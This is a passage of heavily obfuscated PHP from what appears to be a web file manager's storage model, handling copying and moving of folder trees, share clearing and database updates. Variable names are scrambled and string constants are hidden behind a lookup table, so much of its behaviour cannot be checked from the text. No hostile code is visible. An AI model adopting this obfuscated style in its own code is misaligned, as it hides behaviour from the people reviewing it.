$¼§ß¡ØÆ[101] && $äó…Œ™œ == $Å”×²æÒ) { $this->folderSizeResetChildren($äó…Œ™œ); } Model($¼§ß¡ØÆ[660])->addAll($“òÂ·Œ²[$¼§ß¡ØÆ[658]], array(), !0); if ($äó…Œ™œ != $Å”×²æÒ || $™õó“ÍÍ[$¼§ß¡ØÆ[505]] == $¼§ß¡ØÆ[101]) { Model($¼§ß¡ØÆ[661])->eventCopy($Å”×²æÒ); } $this->saveAll($“òÂ·Œ²[$¼§ß¡ØÆ[659]]); Model($¼§ß¡ØÆ[241])->linkAdd($“òÂ·Œ²[$¼§ß¡ØÆ[657]]); $this->folderSizeReset($¡©¤ø¹»); $this->updateModifyTime($¡©¤ø¹»); return $Å”×²æÒ; } private function _copy($šœ¨×«Ã, $®üèÚë”, $–†‡øÑÄ, &$Ïáø¤©, $ÍÓ†§ßõ, $ËºŞïé¬ = '') { $ÕÒù•œ± =& $_SERVER[ŒÅŸ‹ä†]; $¦ƒ”×ƒ = $this->sourceInfoCache($šœ¨×«Ã); $¬§Íá’æ = $¦ƒ”×ƒ[$ÕÒù•œ±[505]] == $ÕÒù•œ±[101]; $Áª˜›²§ = $ËºŞïé¬ ? $ËºŞïé¬ : $¦ƒ”×ƒ[$ÕÒù•œ±[42]]; $‘­£µ¤Š = $this->fileNameExistAuto($®üèÚë”, $¦ƒ”×ƒ); if ($ÍÓ†§ßõ) { $this->_childrenAllMake($šœ¨×«Ã); if ($¬§Íá’æ && $‘­£µ¤Š) { $this->_childrenAllMake($‘­£µ¤Š); } } if (!$‘­£µ¤Š) { return $this->_copyCreate($šœ¨×«Ã, $®üèÚë”, $Áª˜›²§, $Ïáø¤©); } $‹Ê±öÚÛ = $‘­£µ¤Š; if ($¬§Íá’æ) { if ($–†‡øÑÄ == REPEAT_RENAME_FOLDER) { $Áª˜›²§ = $this->fileNameAutoCache($®üèÚë”, $Áª˜›²§, $–†‡øÑÄ, $¬§Íá’æ); $‹Ê±öÚÛ = $this->_copyCreate($šœ¨×«Ã, $®üèÚë”, $Áª˜›²§, $Ïáø¤©); } else { $¬Õò¼€ô = $this->_childrenList($šœ¨×«Ã); foreach ($¬Õò¼€ô as $Ì¢°’¢Ä) { $this->_copy($Ì¢°’¢Ä[$ÕÒù•œ±[202]], $‘­£µ¤Š, $–†‡øÑÄ, $Ïáø¤©, !1); } } } else { if ($–†‡øÑÄ == REPEAT_RENAME || $–†‡øÑÄ == REPEAT_RENAME_FOLDER) { $Áª˜›²§ = $this->fileNameAutoCache($®üèÚë”, $Áª˜›²§, $–†‡øÑÄ, $¬§Íá’æ); $‹Ê±öÚÛ = $this->_copyCreate($šœ¨×«Ã, $®üèÚë”, $Áª˜›²§, $Ïáø¤©); } else { if ($–†‡øÑÄ == REPEAT_REPLACE) { $ìå‘÷Ñû = $this->sourceInfoCache($‘­£µ¤Š); $öÓ²¤Çæ = $this->fileHistory($ìå‘÷Ñû, $¦ƒ”×ƒ[$ÕÒù•œ±[562]], $¦ƒ”×ƒ[$ÕÒù•œ±[89]]); if ($öÓ²¤Çæ) { $Ïáø¤©[$ÕÒù•œ±[657]][] = $¦ƒ”×ƒ[$ÕÒù•œ±[562]]; } } else { if ($–†‡øÑÄ == REPEAT_SKIP) { } } } Hook::trigger($ÕÒù•œ±[662], array($ÕÒù•œ±[663], $¦ƒ”×ƒ, 0)); } return $‹Ê±öÚÛ; } private function _copyCreate($¸»­íÖ, $ÅĞòâû•, $‡Ç¥«Ÿ€, &$ÍÂÚ€ûÆ) { $îÌìûŒŸ =& $_SERVER[ŒÅŸ‹ä†]; $å„Ã ®• = $this->sourceInfoCache($¸»­íÖ); $ç¯®Ë = $this->sourceInfoCache($ÅĞòâû•); $£ŞÄ¼áÒ = $this->_makeItemData($å„Ã ®•, $ç¯®Ë, $‡Ç¥«Ÿ€); Hook::trigger($îÌìûŒŸ[664], $£ŞÄ¼áÒ); Hook::trigger($îÌìûŒŸ[665], array($îÌìûŒŸ[666], $£ŞÄ¼áÒ, 0)); $Š€Õ¨ = $this->add($£ŞÄ¼áÒ); $©ƒº˜‚ = array($îÌìûŒŸ[202] => $Š€Õ¨, $îÌìûŒŸ[42] => $‡Ç¥«Ÿ€); $this->_copyApplyMeta($©ƒº˜‚, $ÍÂÚ€ûÆ); if ($å„Ã ®•[$îÌìûŒŸ[505]] != $îÌìûŒŸ[101]) { $ÍÂÚ€ûÆ[$îÌìûŒŸ[657]][] = $å„Ã ®•[$îÌìûŒŸ[562]]; return $Š€Õ¨; } $ØáÔ´¶ = array(); $ïÁá¥äÑ = array(); $this->_childrenListAll($¸»­íÖ, $ØáÔ´¶); $‡²…ÒƒÖ = count($ØáÔ´¶); if ($‡²…ÒƒÖ == 0) { return $Š€Õ¨; } $÷ºÀØõ = $this->sourceInfo($Š€Õ¨); foreach ($ØáÔ´¶ as $öâ¾Õé) { $¤‰»äƒÛ = $this->_makeItemData($öâ¾Õé, $÷ºÀØõ, $öâ¾Õé[$îÌìûŒŸ[42]]); $¤‰»äƒÛ[$îÌìûŒŸ[609]] = $öâ¾Õé[$îÌìûŒŸ[609]]; $ïÁá¥äÑ[] = $¤‰»äƒÛ; } $this->chunkEventSet($îÌìûŒŸ[667], array($îÌìûŒŸ[668], $£ŞÄ¼áÒ, $‡²…ÒƒÖ)); $this->addAll($ïÁá¥äÑ, array(), !1); $Îşğü¡ò = $this->where(array($îÌìûŒŸ[201] => $Š€Õ¨))->select(); $ØÅ¼Ø±¦ = $this->_childrenMakeRelation($ØáÔ´¶, $Îşğü¡ò); $ØÅ¼Ø±¦[$¸»­íÖ] = $Š€Õ¨; $–ƒŸÛƒÁ = array(); $²×º«ûœ = array(); foreach ($Îşğü¡ò as $öâ¾Õé) { $Œ®ªé× = $öâ¾Õé[$îÌìûŒŸ[202]]; $ëÈãñ“Â = $this->_childrenMatch($ØÅ¼Ø±¦, $öâ¾Õé, $÷ºÀØõ); $–ƒŸÛƒÁ[] = array($îÌìûŒŸ[202], $Œ®ªé×, $îÌìûŒŸ[201], $ëÈãñ“Â[$îÌìûŒŸ[201]]); $²×º«ûœ[] = array($îÌìûŒŸ[202], $Œ®ªé×, $îÌìûŒŸ[609], $ëÈãñ“Â[$îÌìûŒŸ[609]]); $this->_copyApplyMeta($öâ¾Õé, $ÍÂÚ€ûÆ); if ($öâ¾Õé[$îÌìûŒŸ[505]] != $îÌìûŒŸ[101]) { $ÍÂÚ€ûÆ[$îÌìûŒŸ[657]][] = $öâ¾Õé[$îÌìûŒŸ[562]]; } } $this->chunkEventSet($îÌìûŒŸ[669], array($îÌìûŒŸ[670], $£ŞÄ¼áÒ, $‡²…ÒƒÖ)); $this->saveAll($–ƒŸÛƒÁ); $this->chunkEventSet($îÌìûŒŸ[671], array($îÌìûŒŸ[672], $£ŞÄ¼áÒ, $‡²…ÒƒÖ)); $this->saveAll($²×º«ûœ); return $Š€Õ¨; } private function _childrenMakeRelation($„›–’æô, $äÏßä—ö) { $™÷å¨® =& $_SERVER[ŒÅŸ‹ä†]; $Ò€ğ¬ÄÖ = array(); $Ä«§ö»¹ = array(); foreach ($„›–’æô as $‹İ¹«›ã) { $ãáğä­ó = $‹İ¹«›ã[$™÷å¨®[42]] . $™÷å¨®[8] . $‹İ¹«›ã[$™÷å¨®[609]]; $Ò€ğ¬ÄÖ[$ãáğä­ó] = $‹İ¹«›ã[$™÷å¨®[202]]; } foreach ($äÏßä—ö as $‹İ¹«›ã) { $ãáğä­ó = $‹İ¹«›ã[$™÷å¨®[42]] . $™÷å¨®[8] . $‹İ¹«›ã[$™÷å¨®[609]]; $é «‡’ = $Ò€ğ¬ÄÖ[$ãáğä­ó]; $Ä«§ö»¹[$é «‡’] = $‹İ¹«›ã[$™÷å¨®[202]]; } return $Ä«§ö»¹; } private function _childrenMatch($Šà¢ÏÊı, $ç‘Òİåƒ, $¡âÇ«‰¯) { $ŒÙ¤©ïº =& $_SERVER[ŒÅŸ‹ä†]; $í¹ªüÀ’ = $¡âÇ«‰¯[$ŒÙ¤©ïº[609]]; $Ë¢«õÏ­ = $this->parentLevelArray($ç‘Òİåƒ[$ŒÙ¤©ïº[609]]); foreach ($Ë¢«õÏ­ as $û¾Ê¥Œ) { if (isset($Šà¢ÏÊı[$û¾Ê¥Œ])) { $í¹ªüÀ’ .= $Šà¢ÏÊı[$û¾Ê¥Œ] . $ŒÙ¤©ïº[673]; } } $í¹ªüÀ’ = rtrim($í¹ªüÀ’, $ŒÙ¤©ïº[60]) . $ŒÙ¤©ïº[60]; $ïÖÓÛÉ = $this->parentLevelArray($í¹ªüÀ’); $‹‡š¹„µ = $ïÖÓÛÉ[count($ïÖÓÛÉ) - 1]; return array($ŒÙ¤©ïº[201] => $‹‡š¹„µ, $ŒÙ¤©ïº[609] => $í¹ªüÀ’); } private function _makeItemData($ªŒ”Ò§, $üéÌÄŒ¬, $¦…Ã¢–…) { $À®øÁğı =& $_SERVER[ŒÅŸ‹ä†]; $ìÈ‘˜Ãğ = array($À®øÁğı[674] => $ªŒ”Ò§[$À®øÁğı[505]], $À®øÁğı[514] => $¦…Ã¢–…, $À®øÁğı[675] => $ªŒ”Ò§[$À®øÁğı[506]] ? $ªŒ”Ò§[$À®øÁğı[506]] : $À®øÁğı[12], $À®øÁğı[563] => $ªŒ”Ò§[$À®øÁğı[562]] ? $ªŒ”Ò§[$À®øÁğı[562]] : 0, $À®øÁğı[645] => $ªŒ”Ò§[$À®øÁğı[89]] ? $ªŒ”Ò§[$À®øÁğı[89]] : 0, $À®øÁğı[676] => intval($üéÌÄŒ¬[$À®øÁğı[199]]), $À®øÁğı[677] => intval($üéÌÄŒ¬[$À®øÁğı[594]]), $À®øÁğı[678] => intval(USER_ID), $À®øÁğı[679] => intval(USER_ID), $À®øÁğı[497] => intval($üéÌÄŒ¬[$À®øÁğı[202]]), $À®øÁğı[680] => $üéÌÄŒ¬[$À®øÁğı[609]] . $üéÌÄŒ¬[$À®øÁğı[202]] . $À®øÁğı[60], $À®øÁğı[518] => $ªŒ”Ò§[$À®øÁğı[98]] ? $ªŒ”Ò§[$À®øÁğı[98]] : time(), $À®øÁğı[524] => 0, $À®øÁğı[681] => $À®øÁğı[12]); return $ìÈ‘˜Ãğ; } private function _copyApplyMeta($€ìÚµí°, &$²†Ò¯¼­) { $¡…ÈÃŸª =& $_SERVER[ŒÅŸ‹ä†]; $„’˜ñ× = $€ìÚµí°[$¡…ÈÃŸª[202]]; $ÕÌ‡ÈŞó = $€ìÚµí°[$¡…ÈÃŸª[42]]; if (!isset($€ìÚµí°[$¡…ÈÃŸª[682]]) || !$€ìÚµí°[$¡…ÈÃŸª[682]] || $€ìÚµí°[$¡…ÈÃŸª[682]] == $¡…ÈÃŸª[239]) { $²†Ò¯¼­[$¡…ÈÃŸª[659]][] = array($¡…ÈÃŸª[202], $„’˜ñ×, $¡…ÈÃŸª[682], short_id($„’˜ñ×)); } if (Input::check($ÕÌ‡ÈŞó, $¡…ÈÃŸª[683])) { $²†Ò¯¼­[$¡…ÈÃŸª[658]][] = array($¡…ÈÃŸª[202] => $„’˜ñ×, $¡…ÈÃŸª[105] => $¡…ÈÃŸª[557], $¡…ÈÃŸª[460] => str_replace($¡…ÈÃŸª[63], $¡…ÈÃŸª[12], Pinyin::get($ÕÌ‡ÈŞó))); $²†Ò¯¼­[$¡…ÈÃŸª[658]][] = array($¡…ÈÃŸª[202] => $„’˜ñ×, $¡…ÈÃŸª[105] => $¡…ÈÃŸª[556], $¡…ÈÃŸª[460] => Pinyin::get($ÕÌ‡ÈŞó, $¡…ÈÃŸª[684])); } $²†Ò¯¼­[$¡…ÈÃŸª[658]][] = array($¡…ÈÃŸª[202] => $„’˜ñ×, $¡…ÈÃŸª[105] => $¡…ÈÃŸª[536], $¡…ÈÃŸª[460] => KodSort::makeStr($ÕÌ‡ÈŞó)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($¿ûŸ¦ê±) { $•öã±º =& $_SERVER[ŒÅŸ‹ä†]; $…¾÷ñÃ‡ = $this->sourceInfo($¿ûŸ¦ê±); $€ÍŠÃÃ = $•öã±º[685]; $¹³«’¹é = array($•öã±º[609] => array($•öã±º[640], $…¾÷ñÃ‡[$•öã±º[609]] . $¿ûŸ¦ê± . $•öã±º[641]), $•öã±º[525] => $this->targetIsDelete); $÷ù³íîò = $this->field($€ÍŠÃÃ)->where($¹³«’¹é)->select(); if (!$÷ù³íîò) { return; } $÷ù³íîò = array_to_keyvalue($÷ù³íîò, $•öã±º[202]); foreach ($÷ù³íîò as $Íëä¸Â) { $ìòŒ˜£— = $Íëä¸Â[$•öã±º[201]]; $¿ûŸ¦ê± = $Íëä¸Â[$•öã±º[202]]; if (!isset($this->_childrenListCache[$¿ûŸ¦ê±]) && $Íëä¸Â[$•öã±º[505]] == $•öã±º[101]) { $this->_childrenListCache[$¿ûŸ¦ê±] = array(); } if (!isset($this->_childrenListCache[$ìòŒ˜£—])) { $this->_childrenListCache[$ìòŒ˜£—] = array(); } $this->_childrenListCache[$ìòŒ˜£—][$¿ûŸ¦ê±] = $Íëä¸Â; $this->_childrenItemCache[$¿ûŸ¦ê±] = $Íëä¸Â; } } private function _childrenListAll($ÜË‹¯Ü¨, &$Ç’…Š·) { $Ñ§¸Òù… =& $_SERVER[ŒÅŸ‹ä†]; if (!isset($this->_childrenListCache[$ÜË‹¯Ü¨])) { return; } $£çÕ€Ïú = $this->_childrenListCache[$ÜË‹¯Ü¨]; foreach ($£çÕ€Ïú as $’‰ÖÖ => $×”ˆôƒ) { $Ç’…Š·[$’‰ÖÖ] = $×”ˆôƒ; if ($×”ˆôƒ[$Ñ§¸Òù…[505]] == $Ñ§¸Òù…[101]) { $this->_childrenListAll($’‰ÖÖ, $Ç’…Š·); } } } private function sourceInfoCache($ùÀåÚ±) { if (isset($this->_childrenItemCache[$ùÀåÚ±])) { return $this->_childrenItemCache[$ùÀåÚ±]; } return $this->sourceInfo($ùÀåÚ±); } private function _childrenList($Ø¢¢©“ù) { if (isset($this->_childrenListCache[$Ø¢¢©“ù])) { return $this->_childrenListCache[$Ø¢¢©“ù]; } return $this->_childrenListSelect($Ø¢¢©“ù); } private function _childrenListSelect($Ù—Øâ) { $ß„ä†˜ =& $_SERVER[ŒÅŸ‹ä†]; $°òùåì˜ = array($ß„ä†˜[201] => $Ù—Øâ, $ß„ä†˜[525] => $this->targetIsDelete); $şæÙ•Ëú = $this->where($°òùåì˜)->select(); $şæÙ•Ëú = $şæÙ•Ëú ? $şæÙ•Ëú : array(); $¿©Ûšğ‰ = array_to_keyvalue($şæÙ•Ëú, $ß„ä†˜[202]); $this->_childrenListCache[$Ù—Øâ] = $¿©Ûšğ‰; foreach ($¿©Ûšğ‰ as $Ù—Øâ => $¿Ù»²ˆ) { $this->_childrenItemCache[$Ù—Øâ] = $¿Ù»²ˆ; } return $¿©Ûšğ‰; } private function fileNameExistAuto($²¢‚«Ô´, $¶˜ª•Ç¶) { $ñ”Œ¿ÀÀ =& $_SERVER[ŒÅŸ‹ä†]; if ($¶˜ª•Ç¶[$ñ”Œ¿ÀÀ[525]] == $ñ”Œ¿ÀÀ[101]) { return $this->fileNameExist($²¢‚«Ô´, $¶˜ª•Ç¶[$ñ”Œ¿ÀÀ[42]]); } return $this->fileNameExistCache($²¢‚«Ô´, $¶˜ª•Ç¶[$ñ”Œ¿ÀÀ[42]]); } private function fileNameExistCache($Èß³’À, $Åá€¤±±) { $„¹Àµñ =& $_SERVER[ŒÅŸ‹ä†]; $Åá€¤±± = strtolower($Åá€¤±±); $˜°ÏşÈ = $this->_childrenList($Èß³’À); foreach ($˜°ÏşÈ as $¯ÉÜØ¬Û) { if ($Åá€¤±± == strtolower($¯ÉÜØ¬Û[$„¹Àµñ[42]])) { return $¯ÉÜØ¬Û[$„¹Àµñ[202]]; } } return !1; } private function fileNameAutoCache($ÔÁù€ Å, $µ¤üÔÕ, $×áê¡óÕ, $ó¾˜—Îº) { $ó®‹ÜåŠ =& $_SERVER[ŒÅŸ‹ä†]; $ø”è¬ÜÅ = $this->_childrenList($ÔÁù€ Å); $°ÔòöÈ… = array_to_keyvalue($ø”è¬ÜÅ, $ó®‹ÜåŠ[12], $ó®‹ÜåŠ[42]); return $this->fileNameAutoGet($°ÔòöÈ…, $µ¤üÔÕ, $×áê¡óÕ, $ó¾˜—Îº); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($ƒ”ŠĞÅ¢, $ØĞÒÒ¤, $ÂºÓ„Ú™ = REPEAT_REPLACE, $ÂŠÄ¡Ïé = '') { $çñçŠŒñ =& $_SERVER[ŒÅŸ‹ä†]; $º¿Åâß· = $this->sourceInfo($ƒ”ŠĞÅ¢); $âÒ’ƒÅ• = $this->sourceInfo($ØĞÒÒ¤); if ($º¿Åâß·[$çñçŠŒñ[201]] == $âÒ’ƒÅ•[$çñçŠŒñ[202]]) { if ($º¿Åâß·[$çñçŠŒñ[525]] == $çñçŠŒñ[101]) { Model($çñçŠŒñ[523])->restore(array($ƒ”ŠĞÅ¢)); } if (!$ÂŠÄ¡Ïé || $ÂŠÄ¡Ïé == $º¿Åâß·[$çñçŠŒñ[42]]) { return $ƒ”ŠĞÅ¢; } } $âÊ‰ßµÆ = $this->pathInfoMore($ƒ”ŠĞÅ¢); if ($this->isParentOf($ƒ”ŠĞÅ¢, $ØĞÒÒ¤)) { return !1; } if (!$º¿Åâß· || !$âÒ’ƒÅ• || $âÒ’ƒÅ•[$çñçŠŒñ[505]] != $çñçŠŒñ[101]) { return !1; } Hook::trigger($çñçŠŒñ[686], $âÊ‰ßµÆ); $this->targetIsDelete = intval($º¿Åâß·[$çñçŠŒñ[525]]); if ($º¿Åâß·[$çñçŠŒñ[201]] == $ØĞÒÒ¤ && $ÂŠÄ¡Ïé != $º¿Åâß·[$çñçŠŒñ[42]]) { $à÷ÊÓ›ü = $this->fileNameExist($ØĞÒÒ¤, $ÂŠÄ¡Ïé); if ($à÷ÊÓ›ü && $º¿Åâß·[$çñçŠŒñ[505]] == $çñçŠŒñ[239]) { $µŸğâ¸ª = $this->sourceInfo($à÷ÊÓ›ü); $ŸŠÕ€¾ı = $this->fileHistory($µŸğâ¸ª, $º¿Åâß·[$çñçŠŒñ[562]], $º¿Åâß·[$çñçŠŒñ[89]]); if (!$ŸŠÕ€¾ı) { Model($çñçŠŒñ[565])->remove($º¿Åâß·[$çñçŠŒñ[562]]); } $this->removeNow($ƒ”ŠĞÅ¢, !1); $this->folderSizeReset($ØĞÒÒ¤); Hook::trigger($çñçŠŒñ[687], $âÊ‰ßµÆ); return $à÷ÊÓ›ü; } } $×Ã¯Çï¼ = $ÂŠÄ¡Ïé ? $ÂŠÄ¡Ïé : $º¿Åâß·[$çñçŠŒñ[42]]; $this->lockMoveStart($ƒ”ŠĞÅ¢); $this->lockWriteStart($ØĞÒÒ¤, $×Ã¯Çï¼); $¥Öûı•¦ = array($çñçŠŒñ[657] => array(), $çñçŠŒñ[688] => !1); $this->clearShare($ƒ”ŠĞÅ¢, $ØĞÒÒ¤); $öó•Ÿ› = $this->fileNameExistAuto($ØĞÒÒ¤, $º¿Åâß·); $ªè«ŸŠÌ = $this->_move($ƒ”ŠĞÅ¢, $ØĞÒÒ¤, $ÂºÓ„Ú™, $¥Öûı•¦, $ÂŠÄ¡Ïé); $this->sourceCacheClear(); if ($º¿Åâß·[$çñçŠŒñ[505]] == $çñçŠŒñ[101] && $öó•Ÿ›) { $this->folderSizeResetChildren($ªè«ŸŠÌ); } Model($çñçŠŒñ[241])->linkAdd($¥Öûı•¦[$çñçŠŒñ[657]]); if ($ªè«ŸŠÌ && $öó•Ÿ› && $¥Öûı•¦[$çñçŠŒñ[688]]) { $°Ô’•Îİ = $º¿Åâß·[$çñçŠŒñ[505]] == $çñçŠŒñ[101] ? $this->_childrenListSelect($ƒ”ŠĞÅ¢) : !1; $³©÷Ö¾ğ = $°Ô’•Îİ && count($°Ô’•Îİ) > 0 ? !0 : !1; $this->removeNow($ƒ”ŠĞÅ¢, $³©÷Ö¾ğ); } $this->lockMoveEnd($ƒ”ŠĞÅ¢); $this->lockWriteEnd($ØĞÒÒ¤, $×Ã¯Çï¼); $this->folderSizeReset($º¿Åâß·[$çñçŠŒñ[201]]); $this->folderSizeReset($ØĞÒÒ¤); $Å°ÂúÓ÷ = array($º¿Åâß·[$çñçŠŒñ[201]], $ØĞÒÒ¤); if ($º¿Åâß·[$çñçŠŒñ[505]] == $çñçŠŒñ[101]) { $Å°ÂúÓ÷[] = $ƒ”ŠĞÅ¢; } $this->updateModifyTime($Å°ÂúÓ÷); Model($çñçŠŒñ[661])->eventMove($ƒ”ŠĞÅ¢, $º¿Åâß·[$çñçŠŒñ[201]], $ØĞÒÒ¤); Hook::trigger($çñçŠŒñ[687], $âÊ‰ßµÆ); return $ªè«ŸŠÌ; } private function _move($€æáÃş, $ÖÔ†È€­, $ûü”Šì, &$ıÑ†ç€Œ, $¹ÎÉè = '') { $†‰ö–­ =& $_SERVER[ŒÅŸ‹ä†]; $±¥•Ãñ = $this->sourceInfo($€æáÃş); $³™–¦ö = $±¥•Ãñ[$†‰ö–­[505]] == $†‰ö–­[101]; $êêëÛ– = $¹ÎÉè ? $¹ÎÉè : $±¥•Ãñ[$†‰ö–­[42]]; $ˆÃ©¿•² = $this->fileNameExistAuto($ÖÔ†È€­, $±¥•Ãñ); $this->lockMoveStart($€æáÃş); $this->lockWriteStart($ÖÔ†È€­, $êêëÛ–); if (!$ˆÃ©¿•²) { return $this->_moveForce($€æáÃş, $ÖÔ†È€­, $êêëÛ–); } $° éòÚ¡ = $ˆÃ©¿•²; $¯š¸è—û = !1; if ($³™–¦ö) { if ($ûü”Šì == REPEAT_RENAME_FOLDER) { $êêëÛ– = $this->fileNameAuto($ÖÔ†È€­, $êêëÛ–, $ûü”Šì, $³™–¦ö); $° éòÚ¡ = $this->_moveForce($€æáÃş, $ÖÔ†È€­, $êêëÛ–); } else { $¥›•öÔÀ = $this->_childrenListSelect($€æáÃş); foreach ($¥›•öÔÀ as $Çˆ¬¹åí) { $úí½°äß = REPEAT_REPLACE; $this->_move($Çˆ¬¹åí[$†‰ö–­[202]], $ˆÃ©¿•², $úí½°äß, $ıÑ†ç€Œ); } $¯š¸è—û = !0; } } else { if ($ûü”Šì == REPEAT_RENAME || $ûü”Šì == REPEAT_RENAME_FOLDER) { $êêëÛ– = $this->fileNameAuto($ÖÔ†È€­, $êêëÛ–, $ûü”Šì, $³™–¦ö); $° éòÚ¡ = $this->_moveForce($€æáÃş, $ÖÔ†È€­, $êêëÛ–); } else { $¾ï·Î­À = $this->sourceInfoCache($ˆÃ©¿•²); $Éıë¼Ç = $this->fileHistory($¾ï·Î­À, $±¥•Ãñ[$†‰ö–­[562]], $±¥•Ãñ[$†‰ö–­[89]]); if ($Éıë¼Ç) { $ıÑ†ç€Œ[$†‰ö–­[657]][] = $±¥•Ãñ[$†‰ö–­[562]]; } $¯š¸è—û = !0; } } if ($¯š¸è—û) { $ıÑ†ç€Œ[$†‰ö–­[688]] = !0; } return $° éòÚ¡; } private function _moveForce($ñ–ïÀ¿ı, $üå“æÕÍ, $¿ğ«Ç€ò) { $“ÇÛÒù¨ =& $_SERVER[ŒÅŸ‹ä†]; $ğÇ•½¾ = $this->sourceInfo($ñ–ïÀ¿ı); $Ö°Ÿ™„õ = $this->sourceInfo($üå“æÕÍ); $¶¯İï®ª = $ğÇ•½¾[$“ÇÛÒù¨[505]] == $“ÇÛÒù¨[101]; $ã¡ıòø¹ = array($“ÇÛÒù¨[497] => $Ö°Ÿ™„õ[$“ÇÛÒù¨[202]], $“ÇÛÒù¨[680] => $Ö°Ÿ™„õ[$“ÇÛÒù¨[609]] . $Ö°Ÿ™„õ[$“ÇÛÒù¨[202]] . $“ÇÛÒù¨[60], $“ÇÛÒù¨[676] => $Ö°Ÿ™„õ[$“ÇÛÒù¨[199]], $“ÇÛÒù¨[677] => $Ö°Ÿ™„õ[$“ÇÛÒù¨[594]], $“ÇÛÒù¨[679] => USER_ID, $“ÇÛÒù¨[514] => $¿ğ«Ç€ò); $°ÊôœÖ« = $ğÇ•½¾[$“ÇÛÒù¨[199]] == SourceModel::TYPE_GROUP && $Ö°Ÿ™„õ[$“ÇÛÒù¨[199]] == SourceModel::TYPE_GROUP && $ğÇ•½¾[$“ÇÛÒù¨[594]] == $Ö°Ÿ™„õ[$“ÇÛÒù¨[594]]; if (!$°ÊôœÖ« && $this->moveClearAuth) { Model($“ÇÛÒù¨[592])->authClear($ñ–ïÀ¿ı); } $ÈÃôğ±¯ = $ğÇ•½¾[$“ÇÛÒù¨[525]] == $“ÇÛÒù¨[101] && $Ö°Ÿ™„õ[$“ÇÛÒù¨[525]] != $“ÇÛÒù¨[101]; if ($ÈÃôğ±¯) { $ã¡ıòø¹[$“ÇÛÒù¨[524]] = 0; } if ($¶¯İï®ª) { $½”¼†™È = array($“ÇÛÒù¨[680] => array($“ÇÛÒù¨[640], $ğÇ•½¾[$“ÇÛÒù¨[609]] . $ğÇ•½¾[$“ÇÛÒù¨[202]] . $“ÇÛÒù¨[641])); $ŞêÕ¸ª­ = $ğÇ•½¾[$“ÇÛÒù¨[609]] . $ğÇ•½¾[$“ÇÛÒù¨[202]] . $“ÇÛÒù¨[60]; $ú€‘öÓË = $Ö°Ÿ™„õ[$“ÇÛÒù¨[609]] . $Ö°Ÿ™„õ[$“ÇÛÒù¨[202]] . $“ÇÛÒù¨[60] . $ğÇ•½¾[$“ÇÛÒù¨[202]] . $“ÇÛÒù¨[60]; $’Ä°İ¤É = array($“ÇÛÒù¨[680] => array($“ÇÛÒù¨[689], "\162\x65\x70\x6c\141\143\145\x28\160\x61\162\145\x6e\164\114\x65\166\145\x6c\54\47{$ŞêÕ¸ª­}\x27\x2c\47{$ú€‘öÓË}\47\51"), $“ÇÛÒù¨[676] => $Ö°Ÿ™„õ[$“ÇÛÒù¨[199]], $“ÇÛÒù¨[677] => $Ö°Ÿ™„õ[$“ÇÛÒù¨[594]]); if ($ÈÃôğ±¯) { $’Ä°İ¤É[$“ÇÛÒù¨[524]] = 0; } $this->where($½”¼†™È)->data($’Ä°İ¤É)->save(); } $this->where(array($“ÇÛÒù¨[511] => $ñ–ïÀ¿ı))->data($ã¡ıòø¹)->save(); return $ñ–ïÀ¿ı; } private function clearShare($Û·Á¯¦å, $±ÊØé¢) { $‘üß×ºœ =& $_SERVER[ŒÅŸ‹ä†]; $ù“‚ ÓÃ = $this->sourceInfo($Û·Á¯¦å); $ÜÄ®ê“É = $this->sourceInfo($±ÊØé¢); if ($ù“‚ ÓÃ[$‘üß×ºœ[594]] == $ÜÄ®ê“É[$‘üß×ºœ[594]] && $ù“‚ ÓÃ[$‘üß×ºœ[199]] == $‘üß×ºœ[690]) { return; } $°¹äø•Í = array($‘üß×ºœ[609] => array($‘üß×ºœ[640], $ù“‚ ÓÃ[$‘üß×ºœ[609]] . $Û·Á¯¦å . $‘üß×ºœ[641])); $„‘çÏà = $this->field($‘üß×ºœ[511])->where($°¹äø•Í)->getField($‘üß×ºœ[202], !0); if (!$„‘çÏà) { return; } $°¹äø•Í = array($‘üß×ºœ[202] => array($‘üß×ºœ[7], $„‘çÏà), $‘üß×ºœ[691] => 1); $ÊÌœ“Âœ = Model($‘üß×ºœ[692])->field($‘üß×ºœ[693])->where($°¹äø•Í)->select(); if (!$ÊÌœ“Âœ) { return; } $ÊÌœ“Âœ = array_to_keyvalue($ÊÌœ“Âœ, $‘üß×ºœ[12], $‘üß×ºœ[693]); $°¹äø•Í = array($‘üß×ºœ[693] => array($‘üß×ºœ[7], $ÊÌœ“Âœ)); Model($‘üß×ºœ[692])->where($°¹äø•Í)->save(array($‘üß×ºœ[691] => 0)); Model($‘üß×ºœ[694])->where($°¹äø•Í)->delete(); } public function copyFolderFromIO($±ñü©¿à, $ÎÓ„ê¶›, $ë–ªè¤€, $Öù­ÂÉ, $Ó·½“è, $éØƒÇœ› = false) { $óë§³éü =& $_SERVER[ŒÅŸ‹ä†]; $‹†óšÌ = array($óë§³éü[658] => array(), $óë§³éü[659] => array(), $óë§³éü[657] => array(), $óë§³éü[695] => array()); $€ìãäÃ˜ = $éØƒÇœ› ? $éØƒÇœ› : $±ñü©¿à->pathThis($ÎÓ„ê¶›); $§€÷ Ê× = $this->fileNameExist($ë–ªè¤€, $€ìãäÃ˜); $Ê°ÉÍâô = $this->mkdir($ë–ªè¤€, $€ìãäÃ˜, $Öù­ÂÉ); if (!$§€÷ Ê× || $Öù­ÂÉ == REPEAT_RENAME_FOLDER) { $Öù­ÂÉ = !1; } if ($§€÷ Ê×) { $this->_childrenAllMake($§€÷ Ê×); } Hook::trigger($óë§³éü[696]); $”Ÿ¸¥Ğ = KodIO::ioFileDriverGet($óë§³éü[503] . $ë–ªè¤€ . $óë§³éü[412]); $this->_copyChildTo($±ñü©¿à, $ÎÓ„ê¶›, $Ê°ÉÍâô, $Öù­ÂÉ, $‹†óšÌ, $Ó·½“è, $”Ÿ¸¥Ğ); Hook::trigger($óë§³éü[697]); if ($Ê°ÉÍâô) { $this->folderSizeResetChildren($Ê°ÉÍâô); } $this->_childrenListClear(); Model($óë§³éü[660])->addAll($‹†óšÌ[$óë§³éü[658]], array(), !0); Model($óë§³éü[661])->eventCopy($Ê°ÉÍâô); $this->saveAll($‹†óšÌ[$óë§³éü[659]]); Model($óë§³éü[565])->linkAdd($‹†óšÌ[$óë§³éü[657]]); Model($óë§³éü[565])->remove($‹†óšÌ[$óë§³éü[695]]); $this->folderSizeReset($ë–ªè¤€); $this->updateModifyTime($ë–ªè¤€); return 